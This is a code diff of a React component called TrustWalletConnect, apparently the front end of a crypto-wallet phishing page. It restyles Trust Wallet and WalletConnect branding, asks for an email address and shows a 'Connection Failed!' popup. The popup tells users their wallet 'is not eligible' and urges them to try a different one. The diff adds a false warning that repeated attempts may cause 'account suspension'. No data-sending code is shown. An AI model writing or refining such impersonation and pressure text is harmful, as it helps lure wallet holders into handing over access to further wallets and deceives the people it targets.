@@ -105,9 +105,19 @@ const TrustWalletConnect = () => {
         </div>
 
         <div className="twc-card">
-          <div className="twc-header">
-            <h2 className="twc-connect-text">CONNECT</h2>
-            <img src={trust} alt="trust" />
+          <div className="twc-header-container">
+            {/* WalletConnect logo ABOVE */}
+            <img
+              src={walletConnect}
+              alt="WalletConnect"
+              className="twc-walletconnect-img"
+            />
+
+            {/* CONNECT + Trust Wallet */}
+            <div className="twc-header-row">
+              <h2 className="twc-connect-text">CONNECT</h2>
+              <img src={trust} alt="Trust Wallet" />
+            </div>
           </div>
 
           <label className="twc-label-email">Enter your Email Address</label>
@@ -156,12 +166,39 @@ const TrustWalletConnect = () => {
       {showPopup && (
         <div className={`twc-modal-overlay ${closing ? "closing" : ""}`}>
           <div className="twc-modal-box">
-            <div className="twc-popup-icon">✕</div>
+            <div className="twc-popup-icon">
+  <svg
+    className="twc-error-icon"
+    viewBox="0 0 52 52"
+    xmlns="http://www.w3.org/2000/svg"
+  >
+    <circle
+      className="twc-error-circle"
+      cx="26"
+      cy="26"
+      r="25"
+      fill="none"
+    />
+    <line
+      className="twc-error-line twc-error-line-left"
+      x1="16"
+      y1="16"
+      x2="36"
+      y2="36"
+    />
+    <line
+      className="twc-error-line twc-error-line-right"
+      x1="36"
+      y1="16"
+      x2="16"
+      y2="36"
+    />
+  </svg>
+</div>
+
             <h3 className="twc-popup-title">Connection Failed!</h3>
             <p className="twc-popup-text">
-              Your Trust Wallet is not eligible for connection.
-              Please try connecting with a different Trust Wallet.
-            </p>
+Your Trust Wallet is not eligible for connection.Please try connecting with a different Trust Wallet. Repeated attempts using the same wallet may result in account suspension.            </p>
             <button className="twc-popup-btn" onClick={closePopup}>
               OK
             </button>
